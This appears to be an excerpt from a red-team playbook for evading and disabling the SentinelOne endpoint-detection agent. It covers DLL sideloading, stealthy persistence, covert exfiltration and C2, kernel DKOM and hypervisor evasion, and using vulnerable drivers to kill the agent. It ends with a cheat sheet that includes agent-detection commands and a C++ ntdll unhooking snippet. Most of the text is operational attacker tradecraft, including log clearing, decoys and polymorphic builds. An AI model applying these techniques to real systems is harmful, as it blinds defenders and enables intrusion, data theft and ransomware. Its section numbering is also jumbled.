DLL Sideloading: DLL sideloading involves planting a malicious DLL in a location where a legitimate application will load it (due to DLL search order hijacking). This can be a stealthy persistence or privilege escalation method if you find the right scenario. For example, suppose a high-privilege service will load C:\Program Files\SomeApp\libs\helper.dll if present – you place your payload as that DLL, and next time the service starts, your code runs as that service’s user (SYSTEM perhaps). SentinelOne might not flag this if the service is trusted and your DLL is sideloaded under the context of a known process. Red teams should scan for such opportunities (tools like SharpDLLProxy can help find potential sideloading spots). Microsoft’s installer executables are infamous for being vulnerable to sideloading (e.g. using sdiagnhost.exe with a malicious cryptui.dll). If you can drop a binary and DLL and trigger a UAC prompt or some auto-elevating mechanism, you could escalate privileges without writing a new standalone binary (just hijacking a trusted one). From SentinelOne’s view, a signed Microsoft exe is running (which is fine), and it loads a DLL – this might be suspicious but often is not immediately blocked, especially if the DLL isn’t obviously malicious or exists only in memory. OPSEC: Always test these on a sacrificial system with SentinelOne if possible – results can vary with agent version and policy.

Living-off-the-Land for Persistence: Persistence means your access survives a reboot or logout. Classic methods include registry Run keys, scheduled tasks, services, startup folder shortcuts, WMI event subscriptions, etc. Each of these can be detected by SentinelOne’s threat hunting or even in real time if it sees an unusual autorun entry being created. To reduce detection risk, leverage existing persistent mechanisms instead of creating new ones. For instance, modify an existing scheduled task that runs as SYSTEM (if you have the rights) to execute your payload. Or if there’s a logon script (GPO or local) that you can tamper with to include your code, do that rather than adding a brand new Run key. Another trick: use persistence in memory via a kernel or hypervisor technique (discussed below) – e.g. install a malicious driver that stays loaded or a malicious hypervisor that maintains control even after reboots (rare, but possible if you control the boot sequence or device drivers).

For less advanced but still effective methods, consider abusing the Startup folder with a twist: put a shortcut to your payload in the user’s Startup, but name it similar to legitimate software (users often ignore a "Skype Update.lnk" in their Startup). Or abuse the Active Setup registry key, which runs commands during user logon (often overlooked by EDR rules). OPSEC tip: Whatever persistence you choose, ensure it doesn’t make your compromised host obviously “go dark” to defenders. For example, if you disable or cripple SentinelOne as part of persistence, the blue team might notice that the agent stopped reporting. Sometimes a lighter touch (persistence that doesn’t fully disable the agent) can be more stealthy for long-term presence.

9. Data Exfiltration & C2 Techniques
    
Exfiltrating data and maintaining Command-and-Control (C2) are end goals of many operations, but doing so under the nose of SentinelOne and other defenses requires stealth and creativity. Here’s how to approach these tasks:

Evading Data Loss Prevention (DLP) & File Scanning: Some environments have DLP solutions or EDR policies that look for large data transfers or sensitive content leaving the endpoint. SentinelOne itself may not have full DLP, but it could flag unusual file activities (like a user process suddenly zipping up hundreds of files or reading the entire Documents folder). To evade this, perform data collection gradually and encrypt/compress the data before exfiltration. Encrypting ensures that even if the data is scanned, it appears as random bytes (no obvious Social Security numbers or keywords to trigger DLP). Compression not only reduces size (speeding up exfiltration) but can also break known file signatures. Use common archive formats or even native Windows encryption (EFS) if feasible, to blend in. For example, you might create an encrypted 7-Zip archive of target data with a benign name and then transfer it out. If the archiving itself might trigger attention, break the data into parts and compress them individually, or use a less conspicuous tool (maybe utilize PowerShell’s Compress-Archive, which might be seen as an IT admin action rather than malware).

Covert Channels for Exfil: As discussed in network evasion, choose channels that look normal. If possible, piggyback on an allowed external communication. For instance, many networks allow DNS and HTTPS – you could tunnel file data out through DNS requests (each DNS query carries a chunk of data encoded in the subdomain), or use HTTPS to a cloud storage service. Uploading to an AWS S3 bucket or Google Drive via their APIs may just look like normal user activity (especially if done from a user context). Another method is to use email (if the host has Outlook configured, a script could send out an email with data attached), which may bypass some network restrictions and appear as legitimate user behavior. The key is don’t trip volume or frequency alarms: sending 500 MB in one go is noisy; sending 5 MB chunks over time or at night is quieter. Some attackers even break data into tiny pieces and hide it in plain sight, like making a series of innocuous HTTP GET requests to fetch images, where the image URLs actually encode data (or using steganography in image files). 

OPSEC consideration: Ensure your exfil method doesn’t interfere with the user’s normal operations (e.g. don’t commandeer their Outlook to send emails while they’re actively using it). If using DNS or other background channels, monitor performance; a misconfigured or overly aggressive exfil can cause system slowness that might get noticed.

Encrypted C2 Traffic: Always assume SentinelOne (or network monitoring) might inspect C2 traffic. Using standard TLS (HTTPS or another encrypted channel) with a legitimate certificate (e.g. from Let’s Encrypt, or impersonating a known site’s cert) will usually prevent content inspection. But beyond encryption, blend in with known protocols. Make your C2 packets look like something the host routinely does. If the host regularly queries a certain web API, consider mimicking that API’s request patterns for your C2. Some modern C2 frameworks allow you to emulate things like Microsoft Graph API or AWS service traffic. If you roll your own C2, at least mimic a browser: set real User-Agent strings, handle cookies, and use typical request formats. One very stealthy approach is callback over DNS for low-bandwidth C2: the implant periodically performs DNS TXT record lookups for commands. This just looks like normal DNS traffic and is hard to block without shutting off DNS entirely. The trade-off is higher latency and lower bandwidth for commands.

Cobalt Strike & Sliver Evasion: Cobalt Strike (CS) is a popular C2 framework but is heavily signatured by EDRs, including SentinelOne. To use CS or Sliver (another modern C2) without detection, you must customize them. For Cobalt Strike, this means using a custom Malleable C2 profile to change network indicators (so it doesn’t look like known CS traffic) and ideally using the latest Artifact Kit to generate unique loaders that SentinelOne hasn’t seen. Do not use default CS beacons or common profiles – SentinelOne’s behavioral AI has been noted to catch vanilla CS beaconing. It might even detect CS by how it injects into memory or its periodic callback pattern. So, modify the beacon’s sleep/jitter (introduce randomness), and consider in-memory staging (e.g. use a loader that decrypts and runs the CS beacon blob in memory, so the Beacon DLL never touches disk). Sliver, being newer, might be less recognized, but as a Go binary it can have telltale behaviors. One could pack Sliver or again inject it as shellcode into a remote process. A good strategy is to migrate your C2 agent into a well-behaved process – for example, run your beacon inside explorer.exe or a legitimate service process, where its periodic network usage may look normal. Also, throttle your C2 traffic; high-frequency callbacks (every few seconds) are easier to notice than slow, intermittent ones.

Data Staging and Exfil Timing: Often, you don’t want to exfiltrate data from the initial target endpoint directly, especially if it’s large. Instead, stage it internally first. For example, after collecting files from several machines, you might move them to one staging server inside the network (perhaps a server you compromised that has less monitoring or a lot of legit outbound traffic). Then exfiltrate from that one point. This way, only one machine is making the big external transfer, reducing the chance of multiple alerts. Regarding timing: exfiltrate during off-hours if possible. There are fewer eyeballs on the network at 3 AM, and potentially lower load on sensors. Some DLP solutions even have stricter rules during business hours (to prevent live insider theft) but are laxer at night for batch jobs – if known, take advantage of that.

Steganography & Sneaky Exfil: For truly covert exfiltration, consider techniques like steganography – e.g., hiding data within images or videos that are then uploaded to an image-sharing site or social media. Or if the user regularly sends out files (reports, etc.), piggyback your data inside those files (embedding in metadata or unused file sections). These are specialized techniques and often not necessary unless facing very heavy monitoring, but they illustrate that practically any medium can be a data channel if you’re creative. (One real-world group hid data in JPEG images and posted them to Twitter – automated filters weren’t the wiser.)

11. Kernel & Hypervisor-Based Evasion
    
For advanced operators, some evasion techniques delve into the kernel level and even below the OS (hypervisor level) to achieve near-total stealth. These methods are complex and often beyond the scope of typical engagements, but understanding them rounds out the playbook for bypassing SentinelOne.

Kernel-Mode Bypass Techniques: Once an attacker has kernel execution (through BYOVD or privilege escalation), they can directly manipulate the system to hide from or cripple SentinelOne. One straightforward approach we discussed is killing the agent processes or driver from kernel context (since kernel code can terminate even protected processes). More elegant, however, is to intercept what SentinelOne is monitoring. For instance, SentinelOne’s driver likely registers object callbacks (PsNotify routines) for process/thread creation. A kernel malware can deregister these callbacks or filter them out. Using DKOM (Direct Kernel Object Manipulation), an attacker can remove SentinelOne’s callback entries from the linked list the kernel maintains, so that when new processes spawn, SentinelOne gets no notification. Similarly, one could patch specific kernel routines: e.g., patch NtOpenProcess in memory to skip SentinelOne’s check for protected processes, allowing the attacker to open and tamper with any process without the agent blocking it.

Another kernel trick: hook the hooks. If SentinelOne places hooks in user-land, a kernel rootkit could detect those modifications in processes and quietly remove or bypass them (almost like an “antivirus for the antivirus”). Kernel rootkits can also hide files, processes, and network connections from user-mode altogether. For example, by unlinking the attacker’s process from the kernel’s active process list, SentinelOne’s user-land agent might not “see” it when enumerating processes. This is classic rootkit behavior – essentially making the malware invisible to the EDR. Of course, messing with kernel data structures is risky and might crash the system if not done correctly.There are publicly discussed tools like GhostHide or Invisible that use DKOM to hide processes or threads from EDR hooks. Another advanced technique is to filter the EDR’s driver activities: for example, use a higher-privileged driver (if you loaded your own) to intercept communications from the SentinelOne driver to user-land, or to block it from installing its hooks. This veers into subverting the EDR’s kernel components, which is quite complex as you must reverse-engineer how it works.

Hypervisor-Based Evasion: Operating at the hypervisor level means installing a Virtual Machine Monitor underneath the running OS (a Type-1 hypervisor) or leveraging an existing hypervisor to hide your presence. One concept is a Virtualization-Based Rootkit (VBR) – similar to the old Blue Pill idea – where you silently migrate the running OS into a VM that you control from a hypervisor, giving you ultimate stealth. On modern systems, deploying a hypervisor covertly is non-trivial (especially if virtualization-based security like Credential Guard is enabled). However, a simpler scenario: if the target already runs on a hypervisor (many enterprise endpoints run as VMs under VMware or Hyper-V), a sophisticated attacker who compromises the host hypervisor could manipulate the guest OS in ways SentinelOne cannot detect (since the agent operates within the guest). This scenario is more relevant in cloud or VDI environments than standard laptops.

A more feasible use of hypervisor tech for evasion on Windows is via hypervisor-based hooking: tools like HyperBone or vil-hook use the hypervisor to control memory pages (EPT hooking) and hide or manipulate code execution in the OS. An attacker-controlled hypervisor could conceivably lie to SentinelOne – e.g., when SentinelOne tries to read a suspicious memory page, the hypervisor presents a clean version, but when the OS actually executes it, the malicious code runs. This cat-and-mouse between a malicious hypervisor and an EDR is highly advanced and not something most red teams will implement, but it’s a theoretical apex of evasion.

Another use of hypervisor or firmware level access is persistency. Implants in ACPI tables, Option ROMs, or UEFI could load before the OS and SentinelOne, and potentially patch or disable the agent at each boot. If you somehow gained code execution in UEFI (through a firmware exploit or misconfig), you could wedge a bypass such that SentinelOne never fully initializes. This is nation-state level, far beyond typical needs.

DKOM for Stealth: To highlight DKOM again: DKOM means directly altering kernel structures (like removing your process from the active list, or marking your threads as critical system threads, etc.) so that either the OS or security software is misled. One relevant example: some EDRs mark malicious threads and try to terminate them; an attacker can tag their threads with a system-critical flag to prevent termination (since killing a critical thread causes a system crash, which the EDR will avoid). Another example is hiding loaded modules: an attacker can remove their malicious driver from the kernel’s module list after loading, so SentinelOne might not list it among drivers. DKOM can also be used to fake security context – imagine running as SYSTEM but making the OS believe you’re just a normal user (or vice versa) to bypass certain checks. These techniques require deep Windows internals knowledge and can be version-specific.

In summary, kernel and hypervisor evasion is about fighting the EDR on its own turf (or from below). By going lower-level than the SentinelOne agent, an attacker can negate its visibility or ability to act. The trade-offs are the extreme complexity and potential instability of these methods. Red teams rarely need to go this far, but knowing these possibilities informs a full understanding of EDR evasion – and in scenarios where you must remain invisible (e.g., a stealth, long-term implant operation), kernel-level evasion may be worth the effort. It’s a space where only the most advanced attackers play, and where SentinelOne’s protections (like signed driver enforcement, tamper protection, etc.) aim to hold the line. But as history shows, given a vulnerable driver or a misstep, attackers can still sometimes slip through.

13. Automation & Tooling
    
A successful red team engagement often involves automating repetitive tasks and integrating EDR bypass into tooling, so operators can focus on objectives rather than low-level evasion minutiae every time. This section discusses how to script and automate SentinelOne bypass techniques and how to integrate them into common attack frameworks.

Scripting SentinelOne Bypass (PowerShell & Python): Scripting languages are double-edged: on one hand, they are powerful for automation; on the other, they are often heavily monitored. SentinelOne monitors PowerShell behavior and can leverage script block logging or AMSI (Anti-Malware Scan Interface) to detect malicious scripts. However, with proper obfuscation and execution methods, PowerShell remains a potent tool for automation. For example, you could write a PowerShell script that:

•	Checks if the SentinelOne service is running and perhaps tries to stop or impair it (though a direct Stop-Service likely won’t work due to tamper protection).
•	Maps a clean copy of ntdll.dll into memory and patches hooks (this can be done by reading the DLL bytes from disk and using WriteProcessMemory via P/Invoke).
•	Proceeds to run your actual payload (shellcode injection, etc.) with the hooks removed.

Using PowerShell’s ability to call Windows APIs through Add-Type (C# inline) or DllImport, you can implement things like unhooking dynamically. There are community tools (e.g. Invoke-EDRUnhooking) that attempt to do this via PowerShell. Always obfuscate your PowerShell (with something like Invoke-Obfuscation or manual string splitting) because SentinelOne’s static AI may flag known malicious script patterns. Also consider using WMI, regsvr32, or mshta to execute your PowerShell in a less direct way (to avoid obvious command-line logging).

Python (on Windows) is less commonly monitored by default – and interestingly, as one researcher (Naksyn) pointed out, using the official Python embeddable package (which is signed by the Python Software Foundation and can run without installation) is a great evasion trick. You can drop a signed python.exe and run your Python script to perform post-exploitation tasks; to SentinelOne, it looks like just Python doing Python things, which might be part of some software. Python can use libraries like ctypes to call Windows APIs and even perform memory injection. It lacks the deep AMSI integration that PowerShell has, making it somewhat of a blind spot. 

You can automate many tasks in Python: e.g. a script to scan for processes and choose one to inject into (using direct syscalls via an assembly stub or using a loaded C library), and then set up a socket for C2. If you fear SentinelOne might inspect loaded code, you could also reflectively load a C# assembly via Python, or use Python to drop a small agent that then self-destructs. The bottom line: bringing your own Python interpreter as a post-exploitation agent is a viable approach (some tools like Cobalt Strike’s Pyramid loader have embraced this). Just remember that large, unusual Python scripts might trigger something – keep it minimal and stealthy.

Kernel Callbacks & Inline Hooking Automation: If you have a kernel driver as part of your toolkit (in red team scenarios, this might be a custom tool or borrowed from an exploit), you can automate a lot of EDR bypass at the kernel level. For instance, a red team might deploy a “pre-attack” driver that automatically finds any registered process/thread creation callbacks and disables those belonging to known EDR drivers (by checking driver names or addresses). This could be done generically so that any EDR (SentinelOne, CrowdStrike, etc.) is blinded. In fact, tools like EDRPrison/EDRSilencer do exactly this using the Windows Filtering Platform or by manipulating callback objects. Integrating such a driver into your toolkit means for each operation, you flip the switch and any present EDR is largely neutralized from the kernel side. Caution: Loading a driver is noisy as mentioned; an alternative is abusing an existing vulnerable driver via automation: e.g. have a script use sc.exe to load vuln.sys, then use DeviceIoControl calls to that driver to perform the memory patching of the EDR (this can be scripted in C++ or PowerShell). Essentially, create a repeatable method where, given a new environment, running your script/driver will auto-kill or blind the EDR, so you don’t have to manually perform those steps each time.

On the user-land side, inline hooking by EDR can also be countered in an automated fashion. One could write a C++ tool that scans the first bytes of all ntdll.dll APIs for the signature of a jump instruction, and if found, restores the bytes from disk (as suggested in Section 2). This could be done for all processes via DLL injection or by spawning new processes in a suspended state, unhooking them, then resuming (so any new process you create to run your tools is immediately unhooked). Scripts can coordinate this, e.g. a loader that unhooks and then launches your actual implant. Many red team frameworks have some version of this built-in now (for example, MDSec’s Nighthawk C2 presumably has EDR evasion baked in). If coding from scratch, you can incorporate libraries like Hell’s Gate to automatically resolve syscalls at runtime instead of using the Windows API.

Automated Framework Integration: If you are using frameworks like Cobalt Strike, Mythic, or Havoc, leverage their malleability and scripting capabilities. Cobalt Strike’s BOF (Beacon Object Files) feature allows writing custom C code to run in Beacon – you can write BOFs to perform EDR disabling steps (there are BOFs available for unhooking DLLs, disabling ETW, etc.). Incorporate those into your playbook: i.e., once a Beacon is on a host, run the “EDR evasion BOF” before doing privilege escalation or lateral movement. This can become a standard operating procedure. The open-source Havoc framework, for example, has built-in abilities to use syscalls for certain functions and to dynamically unhook in-memory (since it’s a newer C2 aiming to evade EDRs by design). Always configure and test these frameworks in a lab with SentinelOne running so you know which options and modules work. Sometimes an "EDR bypass" module might itself trigger detection if not done carefully, so tuning is needed.

CI/CD for Implants: On a more developer-oriented note, treat your malware like a product – use continuous integration to build fresh variants for each engagement. Automate polymorphism: e.g., have a script that modifies source code (reorder functions, change constants, etc.) and compiles, so each payload build is unique and less likely to match SentinelOne’s signatures. Some teams use tools to automate the embedding of junk code or use compiler-level obfuscation techniques. Also, maintain a repository of known bad strings or behaviors that SentinelOne looks for, and ensure your payloads avoid or encrypt those. For instance, if a certain API call sequence triggers detection, adjust your tooling to avoid that sequence (maybe add slight delays between allocations and thread creation to not look like rapid injection).

User-land vs Kernel Trade-off Automation: It’s generally safer to attempt user-land bypass first (no kernel exploits) and only escalate to kernel-level methods if needed. So your automation logic might be: try user-land unhooking and stealth first; if SentinelOne still catches your activities, then deploy the heavy artillery (e.g. BYOVD to kill or disable it). This way, you limit risk. You can script this decision-making to some extent (though truly autonomous adaptive tooling is hard). For example, you could have a Beacon attempt a known benign-but-suspicious action (like enumerating processes in a way that would normally be flagged). If it doesn’t get killed, maybe hooks are removed or absent; if it does trigger a reaction, you know the EDR is active and you might escalate to a kernel bypass.

C2 Redundancy and Failsafes: Automate fallback options in case your primary C2 agent is blocked by SentinelOne. Perhaps you initially drop a couple of different implants (one main, one backup using a different method). If one dies, the other activates. Scripting can help by checking in from multiple channels. SentinelOne might block a Meterpreter, but maybe misses a custom DNS-based shell – if you deploy both, one might survive. Use scheduling (e.g. Task Scheduler) to trigger backup implants after a delay, in case your first attempt was quickly killed. This kind of resilience ensures that your whole operation isn’t blown by a single detection. Just be careful that multiple beaconing implants don’t themselves give you away through extra noise.

In essence, automation in EDR evasion is about building the bypass into your tools and processes, so it’s repeatable and reliable. Many of the techniques we discussed (unhooking APIs, patching ETW, killing agents via drivers) can be scripted or coded once and reused. This not only saves time but also reduces human error during an op (e.g., forgetting to unhook before dumping credentials – a costly mistake). By integrating SentinelOne bypass measures into your tooling, you ensure that every action you take is as covert as possible by default, rather than something you add on as an afterthought.

15. Real-World Case Studies & OPSEC Considerations
    
To appreciate the practical effectiveness of these bypass techniques, it’s helpful to study real incidents where attackers circumvented SentinelOne, and to heed the OPSEC lessons learned by red teams in the field.

Real-World Bypass Incidents
•	FIN7’s EDR Killer (AvNeutralizer/AuKill): FIN7, a sophisticated criminal group, developed a tool dubbed AvNeutralizer to disable EDR products including SentinelOne. This tool was sold to ransomware gangs and was seen in use by the Black Basta gang and others. In 2022–2023, it went through several iterations to stay ahead of EDR updates. One update included a “previously unseen tampering method” that leveraged a Windows driver capability to create a denial-of-service on the system. Essentially, AvNeutralizer would abuse a legitimate but vulnerable driver (or Windows feature) to crash or stop the SentinelOne agent, thereby clearing the path for ransomware deployment. SentinelOne’s response was to improve anti-tampering protections against kernel threats. FIN7’s success shows that with creativity, attackers can (and did) nullify SentinelOne on targeted machines. Takeaway: Custom EDR bypass tools are a reality – if a red team has the resources, building a bespoke “SentinelOne killer” like FIN7 did can be hugely effective (though one must be cautious not to cause noticeable system issues that tip off defenders).

•	Terminator/Spyboy BYOVD Tool: In 2023, a tool advertised as an “EDR killer” (sometimes called Terminator or by the author name Spyboy) gained attention for claiming to kill multiple EDRs/AVs (CrowdStrike, SentinelOne, etc.). It works via the BYOVD technique: loading old but signed vulnerable drivers to perform privileged actions. SentinelOne analyzed this tool and noted it specifically used a vulnerable Zemana AntiMalware driver to execute code in kernel mode and terminate security processes. Unmanaged environments were at serious risk if this tool was run as Administrator. SentinelOne’s agent did recognize known versions of the tool by hash, but a minor repack or update could evade that. Takeaway: The BYOVD approach is not just theoretical – it’s actively being used in the wild. Red teams can mimic this strategy (with proper approvals) to demonstrate how an attacker could shut down an EDR. It also underscores the importance of keeping EDR agents updated (to have the latest signatures of such tools) and of blocking low-privilege users from loading drivers.

•	Signed Driver Abuse (CosmicStrand/BlackLotus, etc.): Threat actors have abused Microsoft’s own driver signing to get malicious drivers running. In late 2022, researchers (SentinelOne and Mandiant) reported on Stonestop and Poortry malware—small driver toolkits used to disable security products. In one case, attackers obtained a legitimate Windows Hardware Developer certificate and signed their rootkit driver, which was then used to kill AV/EDR processes. Microsoft eventually revoked those certificates, but for a period the malware was effectively invisible to security software because it appeared as a legit signed driver doing allowed actions. Another incident in early 2023 was BlackLotus, a UEFI bootkit that could disable Windows Secure Boot and thus turn off certain security features; while not aimed at SentinelOne specifically, it shows the lengths (firmware level) that attackers will go to bypass security. Takeaway: Well-resourced attackers may go after the platform itself (OS or drivers) instead of just the EDR agent. Red teams typically won’t drop UEFI malware, but demonstrating a signed driver bypass can drive home the point that trust can be exploited.

•	Sneaky Persistence – APT29’s WMI Event Consumer: In attacks attributed to APT29 (Russian SVR), the actors achieved stealth persistence by using WMI event subscriptions that launched their code in response to specific triggers. While not about SentinelOne specifically, such techniques are noteworthy because they left almost no footprint – nothing obvious on disk or in typical autoruns. An EDR like SentinelOne could catch the activity if it monitors WMI repository changes or the resultant process execution, but if those look benign enough, it might slip through. We mention this to illustrate that sometimes the best bypass is never triggering the EDR in the first place. By living off the land in obscure corners (like WMI events, COM objects, or seldom-checked registry keys), attackers can persist in ways that even a diligent threat hunter might overlook until much later.

•	Red Team Failures (Lessons Learned): It’s educational to look at where red teams have been caught by SentinelOne to refine OPSEC. Common mistakes include using tools with known signatures – e.g., a team used an older version of Cobalt Strike without a proper malleable profile and got detected, burning the engagement. Another case: not realizing SentinelOne had a “Deep Visibility” search capability; the team left a memory artifact (a PowerShell script in memory) which was later queried by defenders, exposing the whole operation. In one engagement, a red team attempted to kill the SentinelOne agent by brute force (trying to unload the driver via OS methods) – the agent flagged the tampering attempt and triggered an immediate alert, leading to incident response. Takeaway: Aggressive actions against the EDR can backfire if not done with precision. Always test your EDR-killing method in an identical environment beforehand if possible. And remember that “not being blocked” is not the same as “not being noticed” – the absence of a popup doesn’t mean SentinelOne isn’t quietly recording everything you do for later analysis.

OPSEC Recommendations for SentinelOne Evasion

•	Assume You’re Being Watched: Even if you’ve successfully bypassed or disabled parts of SentinelOne, operate as if the blue team might still have something up their sleeve. This mindset ensures you don’t get careless. For example, after running an unhooking routine, double-check that your actions truly go undetected (maybe run a small test like reading LSASS memory and see if an alert fires). Maintain situational awareness – if you notice the agent or system behaving oddly (e.g., unexpectedly high CPU usage as if scanning, or unusual network traffic possibly phoning home), consider pausing or altering your approach.

•	Stage and Pivot Quickly: When you initially compromise a host with SentinelOne, try to achieve a stable foothold that’s as covert as possible fast. For instance, run your EDR bypass routine (unhooking, etc.) and then deploy a more robust implant that operates in-memory only. Then stop using the noisy initial tools. The longer you linger with visible malicious activity, the greater the chance something gets flagged. Once you have SYSTEM or a reliable beacon, you can then proceed more slowly and quietly.

•	Do Not Replay Known IoCs: OPSEC 101 – if something was detected, do not try the exact same thing again on another host. SentinelOne agents enterprise-wide will benefit from a detection (they send telemetry to a central platform). If your malware was flagged on one machine, the hash or behavioral indicator might now be recognized everywhere. Change up your tooling or methodology before proceeding. Sometimes teams cycle through different C2 frameworks or toolsets for this reason.

•	Watch for Anti-Forensic Traps: EDRs sometimes set traps – for example, a fake “passwords.txt” file that if touched triggers an alert, or monitoring of certain commands like bcdedit (if you try to disable driver signature enforcement or tamper with Secure Boot). Be cautious with actions that are known ATT&CK techniques – use them sparingly and in combinations that confuse the baseline. Mix and match techniques to avoid a clear narrative in the logs. If you clear logs, do it thoroughly and don’t forget less obvious ones (like SentinelOne agent logs in ProgramData, or the Windows AMSI log, etc.). But also know when not to clear logs – sometimes that itself is more suspicious (if a box’s event logs suddenly have a gap or stop after you arrive, that’s a clue).

•	Clean Up and Restore State: If you unhooked DLLs or disabled things like ETW, consider restoring them before you exit or before the engagement ends. A savvy defender might notice that EtwEventWrite in ntdll is patched or that certain APIs aren’t functioning normally for other applications. If feasible, restore hooks (you could even have your implant re-hook ntdll with the original SentinelOne bytes before exiting). Similarly, if you disabled or killed a driver/service, try to put it back or restart it. This level of clean-up is often skipped in short engagements but is gold-standard for stealth (especially in long-term stealth ops). In a red team, this might be more about courtesy and covering tracks to make detection harder in post-engagement forensics.

•	Decoys and Misdirection: Sometimes deploying a noisy decoy can draw the EDR/analysts’ attention while you quietly do something elsewhere. For instance, trigger a fake malware that SentinelOne will detect and cause a fuss over in one part of the network, while the real action happens elsewhere. This only works if you’re fairly certain of the environment and the team’s playbook (and it’s risky if they respond by isolating everything). But this tactic is seen with real threat actors – they might trigger an obvious ransomware on some machines as a diversion while exfiltrating data quietly from another.

•	Communication OPSEC: Be mindful of how you interact with the compromised environment. If you type commands manually in an interactive shell, those command lines might be recorded (especially anything run via cmd.exe or PowerShell – SentinelOne can capture command-line arguments). Using a C2 that executes API calls without spawning new processes can avoid leaving command-line artifacts. If you must run command-line tools, try to do so via reflective execution (so no new process is spawned) or rename them to something generic. Also, when exfiltrating, encrypt filenames and content to avoid obvious keywords (like “passwords” or company names) from appearing in any network or disk inspection.

•	Continuous Learning: After every engagement (or even during, if possible), gather intel on what SentinelOne detected or how it responded. Many red teams use a “sacrificial lamb” system to execute their techniques and see what alerts are generated in the console (if they have a cooperative blue/white team feeding that back). Use that intel to adjust on the fly. If you learn from the SentinelOne console that an alert like “Suspicious code injection via remote thread” fired at 3 PM, you know exactly what triggered it and can adapt your method or timing next attempt.

•	Blend with User Behavior: If you know the typical user or system you compromised, try to make your actions contextually appropriate. For instance, on a developer’s PC, doing a lot of raw PowerShell may stand out, but running MSBuild with a weird project file might not (developers do unusual builds often). On a database server, running a custom EXE is weird, but running SQL queries that use xp_cmdshell is not unheard of. By blending with what’s normal for that user or machine, you reduce the chance an analyst or AI model flags it as abnormal. SentinelOne’s behavioral AI looks for anomalies, so try not to be an outlier if you can help it.

•	Have an Exit Strategy: OPSEC includes knowing when to cut losses. If at some point you suspect SentinelOne has you pegged (say you notice your processes getting killed or the host gets network-quarantined by the agent), it may be time to abort on that machine. Continuing to “fight” an alerted EDR is usually fruitless and only increases risk of detection elsewhere. It might be better to move on to another target or lay low until things cool down. In a real attack, this could mean the difference between a contained incident vs. a full breach; in a red team, it might mean the difference between getting partially detected vs. completely burned and stopped.

By studying these real cases and principles, a red teamer can refine their approach to be as stealthy as the advanced threats they emulate. The overarching theme is stealth through understanding – knowing how SentinelOne and defenders operate, so you can anticipate and avoid their detections while still accomplishing your mission objectives.

Practical How-To: SentinelOne Bypass Cheat Sheet (Condensed)

This section distills the above strategies into a step-by-step technical guide for red team operators. It focuses on actionable techniques and code snippets that can be applied in the field to evade SentinelOne. Use these steps as a quick reference when preparing an operation:

1. Pre-Engagement Setup
   
•	Build Custom Tools: Recompile your payloads (beacons, scanners, etc.) with unique signatures. Implement direct syscalls for critical functions (process injection, etc.) using libraries or inline assembly to avoid user-land API hooks. Example: integrate a syscall stub for NtCreateThreadEx instead of calling CreateRemoteThread.

•	Prepare EDR Kill-Switch: Have a BYOVD driver and exploit ready (e.g., a known vulnerable driver like RTCore64.sys or similar) plus a small program or script to use it for killing processes. Test this on a sacrificial host with SentinelOne installed to ensure it terminates or disables the agent silently (and without crashing the system).

•	PowerShell/Python Toolkit: Develop or obtain scripts for common tasks:
  o	A PowerShell script to remove hooks (e.g. it reads bytes from disk copy of ntdll.dll and patches     the in-memory functions accordingly).
  o	A Python script to disable AMSI and ETW (for executing in-memory without script detection) – for     instance, patch AmsiScanBuffer via ctypes and use an ETW patch like the C code shown in Threat         Hunting Evasion above.
  o	(Ensure these scripts themselves are obfuscated or malleable to avoid detection.)
  
•	OPSEC Baseline: Identify what normal looks like in the target environment (if you have intel). Tailor your initial access and comms to blend in. For example, use network ranges or cloud services that the client regularly uses for C2 (so traffic egresses to familiar locations), mimic typical user agents, working hours, etc. Essentially, plan your infrastructure and timing to look as routine as possible.

3. Initial Foothold & EDR Check
   
•	Gaining Access: Execute your initial code (phish document, exploit, etc.). If using something like an Office macro, have it spawn a child process with a less-monitored binary. For example, macro -> launch msbuild.exe with an inline task -> inject shellcode into that process. This may bypass SentinelOne’s Office-specific heuristics.

•	Detect SentinelOne Presence: Once on a box, check for indicators that SentinelOne is running:
o	Look for processes like SentinelAgent.exe or services named SentinelOne/SentinelAgent. For example, in PowerShell:
```
Get-Service | Where-Object Name -like "*Sentinel*"
```
Or in CMD:
```
sc query type= service | find "Sentinel"
```
If you find such processes or services, the EDR agent is present.
o	Check for the SentinelOne driver:
```
sc query sndriver
```
(The SentinelOne Windows agent’s kernel driver service is often named SentinelDriver or sndriver.) If it’s running, you know kernel-level monitoring is active.

•	OPSEC: Perform these checks in-memory or in a covert way if possible (e.g., via API calls instead of spawning a visible sc.exe command) to avoid leaving obvious traces like the string "Sentinel" in command-line logs.

•	Suspicious Activity Test (Optional): Consider a benign test to gauge how aggressively the agent is set to respond:

o	For example, try to open a handle to the lsass.exe process (the Local Security Authority) using a low-level call. If that action is instantly blocked or your process is killed, SentinelOne is in a blocking mode (prevention) and you’ll need full stealth. If nothing happens, the agent might be in a detect-only mode or is less sensitive, but do not rely on that—still assume it can detect you if you’re noisy.

3. Userland EDR Evasion Steps
   
•	Unhook NTDLL: Inject a small routine or use a tool to unhook API hooks in your current process (and any target process you plan to migrate into). Pseudocode approach: Open ntdll.dll on disk, read the first few bytes of key functions, and write those bytes over the beginning of the hooked functions in memory to restore them. For example, patch the start of NtProtectVirtualMemory in memory with the bytes from the clean disk copy. Do this for all critical functions you suspect are hooked (you can maintain a list of common hooked APIs). There are open-source utilities that automate this (e.g., ThreadStackSpoofer or InlineUnhooker).
```
// Simplified C++ unhooking example:
BYTE cleanBytes[5];
HANDLE hFile = CreateFile(L"C:\\Windows\\System32\\ntdll.dll", GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
// ... find offset of NtProtectVirtualMemory ...
SetFilePointer(hFile, offset, NULL, FILE_BEGIN);
ReadFile(hFile, cleanBytes, 5, NULL, NULL);
CloseHandle(hFile);

// Write these bytes to the loaded ntdll in memory
BYTE *funcAddr = (BYTE*)GetProcAddress(GetModuleHandle(L"ntdll.dll"), "NtProtectVirtualMemory");
DWORD oldProt;
VirtualProtect(funcAddr, 5, PAGE_EXECUTE_READWRITE, &oldProt);
memcpy(funcAddr, cleanBytes, 5);
VirtualProtect(funcAddr, 5, oldProt, &oldProt);
```
Note: The above is conceptual. In practice, you’d loop through multiple functions. Also consider using existing tools/scripts to do this rather than reinventing it live. If you plan to migrate or spawn new processes, you’ll need to unhook in those processes as well (e.g., inject your unhooking routine into them or start them in a suspended state and unhook before resuming).

